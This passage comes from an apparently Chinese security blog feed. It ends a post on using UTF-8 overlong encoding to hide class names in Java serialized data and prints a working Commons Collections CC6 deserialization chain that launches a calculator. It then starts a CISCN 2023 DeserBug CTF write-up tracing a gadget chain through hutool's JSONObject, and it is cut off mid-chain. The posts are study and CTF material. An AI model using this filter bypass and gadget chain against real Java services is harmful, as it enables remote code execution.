bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeUTF</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡æµ‹è¯•"><a href="#ç»•è¿‡æµ‹è¯•" class="headerlink" title="ç»•è¿‡æµ‹è¯•"></a>ç»•è¿‡æµ‹è¯•</h2><p>è¿™é‡Œç›´æ¥æ‰“ä¸€ä¸ªæ™®é€šcc6çš„é“¾å­æ¥æµ‹è¯•æ˜¯å¦å¯ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.overlong;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.clown.Utils.CustomObjectOutputStream;<br><span class="hljs-keyword">import</span> org.clown.Utils.UTF8OutputStream;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//è¿™é‡Œå¾…ä¼šè°ƒç”¨çš„æ—¶å€™ä¼šåœ¨mpaæ–°å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br><span class="hljs-comment">//        serialize(hashMap);</span><br><span class="hljs-comment">//        serialize1(hashMap);</span><br><span class="hljs-comment">//        serialize2(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        CustomObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//æ­£å¸¸åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize1</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//é‡å†™writeUTFçš„åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize2</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        UTF8OutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å»çœ‹ä¸€ä¸‹ä½¿ç”¨å‰åå­—èŠ‚æµçš„å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241022221131584.png" alt="image-20241022221131584"></p><p><img src="https://cdn.clown2024.cn/image-20241022221119279.png" alt="image-20241022221119279"></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯æˆåŠŸå˜æˆä¸å¯è¯»çš„ç±»åäº†,ååºåˆ—åŒ–ä¹Ÿæ˜¯èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p><p><img src="https://cdn.clown2024.cn/image-20241022221255341.png" alt="image-20241022221255341"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/13932?accounttraceid=6f1030b220f8464eb2815f87796f4570daql&time__1311=eqRxyDcGG=k8D/D0D5IheGuDYwe=jDQwhD&alichlgref=https://account.aliyun.com/&u_atoken=569ca1e0aebe29a9b429829147e2aae3&u_asig=0a472f9217296064164077608e011c">javaåŸç”Ÿååºåˆ—åŒ–OverlongEncodingåˆ†æåŠå®æˆ˜ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg">UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰åªæ˜¯æµ…æµ…çš„çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œç°åœ¨æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨javaé¢˜ç›®ä¸­æœ‰æ—¶ä¼šç”¨åˆ°è¯¥æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡&lt;/p&gt;
&lt;h1 id=&quot;utf-8ç¼–ç è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#UTF-8ç¼–ç è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;UTF-8ç¼–ç è¿‡ç¨‹&quot;&gt;&lt;/a&gt;UTF-</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023å›½èµ›DeserBugå¤ç°</title>
    <link href="https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-15T08:27:33.000Z</published>
    <updated>2024-10-15T08:41:29.572Z</updated>
    
    <content type="html"><![CDATA[<p>è™½è¯´é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç”±äºjavaé¢˜ç›®åšçš„è¿˜ä¸æ˜¯å¾ˆå¤šä¸å¤ªç†Ÿæ‚‰ï¼Œè€Œä¸”javaåŸºç¡€ä¸ç‰¢ï¼Œå¯¼è‡´ä¸€äº›ç‚¹è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><h1 id="deserbugé¢˜ç›®"><a href="#DeserBugé¢˜ç›®" class="headerlink" title="DeserBugé¢˜ç›®"></a>DeserBugé¢˜ç›®</h1><p>jadxåç¼–è¯‘æºç </p><p><img src="https://cdn.clown2024.cn/202410151633485.png" alt="image-20241015163331429"></p><p>Testappè¿™é‡Œï¼Œç›´æ¥æ ¹ç›®å½•ä¼ ä¸€ä¸ªbugstrå‚æ•°ï¼Œç„¶åå°†å†…å®¹base64è§£ç åååºåˆ—åŒ–</p><p>Myexpectæ˜¯ä¸€ä¸ªå¼‚å¸¸ç±»ï¼Œæ²¡çœ‹å‡ºæœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹</p><p>ç„¶åé¢˜ç›®é™„ä»¶è¿˜ç»™äº†ä¸¤ä¸ªåŒ…commons-collections-3.2.2.jarï¼Œhutool-all-5.8.18.jar</p><p><img src="https://cdn.clown2024.cn/202410151633951.png" alt="image-20241015163239379"></p><p>ç‰¹æ„ç»™äº†ä¸€ä¸ª3.2.2æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŒæŸ¥äº†ä¸€ä¸‹commons-collectionsä»3.2.2ç‰ˆæœ¬å¼€å§‹å°è¯•åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–InvokerTransformerç±»éƒ½ä¼šæŠ›å‡ºUnsupportedOperationExceptionå¼‚å¸¸</p><blockquote><p>ä¸”è¯¥ç‰ˆæœ¬åœ¨ä¸€äº›å±é™©çš„Transformerå®ç°ç±»çš„readObjectå‰åŠ ä¸Šäº†FunctorUtils#checkUnsafeSerializationæ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚</p></blockquote><p>ç„¶åæ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œå»çœ‹wpå½“æ—¶é¢˜ç›®è¿˜ç»™äº†ä¸¤ä¸ªæç¤º</p><blockquote><ol><li>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</li><li>jdk8u202(è¿™ä¸ªæœ¬åœ°æµ‹è¯•æ²¡ä»€ä¹ˆå½±å“)</li></ol></blockquote><p>æˆ‘å°±è¯´é‚£ä¸ªç‰¹åœ°å†™çš„Myexpectç±»æ€ä¹ˆä¼šæ²¡ç”¨ï¼ˆ</p><p>ä¼°è®¡è¿™ä¸­é—´å°±æ˜¯ç»™äº†ä¸€æ®µé“¾å­çš„æç¤ºä¸ç”¨è‡ªå·±æŒ–</p><p>æˆ‘ä»¬ç°åœ¨å°±æ ¹æ®æç¤ºå»çœ‹ä¸€ä¸‹ä»–çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ¬åœ°å·¥ç¨‹å¯¼å…¥ä»–ç»™çš„jaråŒ…æ¥çœ‹</p><p>çœ‹åˆ°com.app.Myexpect#getAnyexcept</p><p><img src="https://cdn.clown2024.cn/202410151634172.png" alt="image-20241015163448121"></p><p>è¿™é‡Œæœ‰ä¸ªnewInstanceï¼Œåº”è¯¥å°±æ˜¯æœ€åè¦æ‰§è¡Œçš„åœ°æ–¹ï¼Œå°±å¯ä»¥ç”¨åˆ°TemplatesImplçš„é“¾å­</p><p>emmm Hutoolæ²¡æ‰¾å‡ºæ¥åˆ©ç”¨é“¾ï¼Œæ‰“äº†ä¸ªcc3è¯•äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410151635530.png" alt="image-20241015163503477"></p><p>InstantiateTransformerè¿™ä¸ªç±»ä¹Ÿç”¨ä¸äº†ï¼Œä¸ä¼šäº†çœ‹wpäº†</p><p>wpæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136748656">https://blog.csdn.net/uuzeray/article/details/136748656</a></p><p>çœ‹äº†ä¹‹åå‘ç°å…¶å®æ˜¯æœ‰ç‚¹åˆç†çŒœæµ‹çš„æ€è·¯åœ¨é‡Œé¢ï¼Œå¹¶æ²¡æœ‰å®Œå…¨è°ƒè¯•ï¼Œè¿™ä¹Ÿæ˜¯å’Œjavaçš„ç‰¹æ€§æœ‰å…³</p><p>å»çœ‹JSONObject</p><p><img src="https://cdn.clown2024.cn/202410151635818.png" alt="image-20241015163529771"></p><p>å¯ä»¥çŸ¥é“ä»–æ˜¯ä¸€ä¸ªmapï¼Œä»–çš„putæ–¹æ³•å°±ç›¸å½“äºæ˜¯map.put</p><p>é‚£putæ–¹æ³•åˆè¯¥æ€ä¹ˆæ ·è°ƒç”¨å‘¢ï¼Œæˆ‘ä»¬çš„lazyMap#getæ˜¯å¯ä»¥è°ƒç”¨putæ–¹æ³•çš„</p><p><img src="https://cdn.clown2024.cn/202410151635507.png" alt="image-20241015163539460"></p><p>å¦‚æœkeyä¸å­˜åœ¨ä»–å°±ä¼šè°ƒç”¨putæ–¹æ³•ï¼Œä»¤æˆ‘ä»¬çš„mapä¸ºJSONObjectå³å¯ï¼Œç„¶åJSONObjectå› ä¸ºæ˜¯mapï¼Œæˆ‘ä»¬å­˜å…¥çš„valueæ˜¯objectçš„è¯ï¼Œä»–å°±ä¼šéœ€è¦è·å–å¯¹è±¡ç›¸å…³å±æ€§ä¿¡æ¯ï¼Œé‚£æ€ä¹ˆè·å–ï¼Œåº”è¯¥å°±æ˜¯éœ€è¦é€šè¿‡getteræ–¹æ³•ï¼Œæ‰€ä»¥å°±è§¦å‘äº†æˆ‘ä»¬çš„getAnyexceptæ–¹æ³•</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥èµ°cc5çš„BadAttributeValueExpExceptioné‚£æ¡é“¾å­åˆ°lazyMap#getçš„é‚£éƒ¨åˆ†ï¼Œç„¶åå†æ‹¼ä¸ŠJSONObjectçš„é‚£éƒ¨åˆ†é“¾å­</p><p>æœ€ç»ˆé“¾å­å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject --&gt; TiedMapEntry#toString --&gt; LazyMap#get --&gt; JSONObject#put --&gt; Myexpect#getAnyexcept --&gt; 